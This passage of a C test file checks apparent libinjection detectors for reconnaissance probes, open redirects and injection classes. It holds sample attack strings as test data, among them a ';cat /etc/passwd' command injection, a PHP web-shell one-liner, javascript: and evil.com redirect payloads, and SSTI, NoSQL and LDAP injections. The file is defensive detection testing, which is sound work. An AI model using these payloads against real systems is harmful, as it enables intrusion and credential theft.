    ok(libinjection_recon("c:\\boot.ini", 11), "boot ini win");
    /* recon: admin panels */
    ok(libinjection_recon("/admin/phpmyadmin/", 18), "phpmyadmin probe");
    ok(libinjection_recon("/actuator/env", 13), "actuator probe");
    /* recon: word boundaries keep prose benign */
    ok(! libinjection_recon("environment variable", 20), "environment benign");
    ok(! libinjection_recon("maps and directions", 19), "maps benign");
    ok(! libinjection_recon("django.contrib.admin.site", 25), "django admin benign");
    ok(! libinjection_recon("", 0), "recon empty");

    /* redirect: script schemes */
    ok(libinjection_redirect("javascript:alert(1)", 18), "javascript bare");
    ok(libinjection_redirect("q=javascript:alert(1)", 21), "javascript kv");
    ok(libinjection_redirect("vbscript:msgbox(1)", 18), "vbscript");
    ok(libinjection_redirect("data:text/html,<script>", 23), "data html");
    /* redirect: protocol-relative and userinfo */
    ok(libinjection_redirect("next=//evil.com/cb", 18), "protocol relative");
    ok(libinjection_redirect("returnUrl=///evil.com", 21), "triple slash");
    ok(libinjection_redirect("url=https://x:pass@evil.com/", 28), "userinfo https");
    ok(libinjection_redirect("goto=http://t.com@evil.com/", 27), "userinfo http");
    /* redirect: base64 padding must not break value detection */
    ok(libinjection_redirect("data:text/html;base64,PT4=", 26), "data base64 eq");
    /* redirect: benign shapes */
    ok(! libinjection_redirect("next=/detail/123", 16), "internal path");
    ok(! libinjection_redirect("path=/usr/share/doc", 19), "usr path");
    ok(! libinjection_redirect("goto=//comment-not-a-host", 25), "slash comment benign");
    ok(! libinjection_redirect("cb=https://api.vendor.io/v1", 27), "vendor url benign");
    ok(! libinjection_redirect("", 0), "redirect empty");
}

static void test_classify_p23(void)
{
    group("classify_p23");

    ok((libinjection_classify(";cat /etc/passwd", 16,
                             LIBINJECTION_CLASS_ALL) & LIBINJECTION_CLASS_CMD) != 0,
       "classify cmd");
    ok(libinjection_classify("{{7*7}}", 7,
                             LIBINJECTION_CLASS_ALL) == LIBINJECTION_CLASS_SSTI,
       "classify ssti");
    ok(libinjection_classify("login[$ne]=1", 12,
                             LIBINJECTION_CLASS_ALL) == LIBINJECTION_CLASS_NOSQL,
       "classify nosql");
    ok(libinjection_classify("*)(uid=*))(|(uid=*", 18,
                             LIBINJECTION_CLASS_ALL) == LIBINJECTION_CLASS_LDAP,
       "classify ldap");
    ok(libinjection_classify("<?php system($_GET['c']); ?>", 28,
                             LIBINJECTION_CLASS_ALL) == LIBINJECTION_CLASS_CODE,
       "classify code");
}

int main(void)
{
    test_version();
    test_urldecode();
    test_sqli_url();
    test_tokenize();
    test_fold();
    test_fingerprint();
    test_detect();
    test_not_whitelist_branches();
    test_html5();
    test_html5_states();
    test_xss();
    test_coverage_battery();
    test_classify();
    test_trav();
    test_ssrf();
    test_deser();
    test_crlf();
    test_classify_p1();
    test_cmd();
    test_ssti();
    test_nosql();
    test_ldap();
    test_code();
    test_classify_p23();

    printf("%d checks, %d failures\n", g_count, g_fail);
    return g_fail > 0;
}
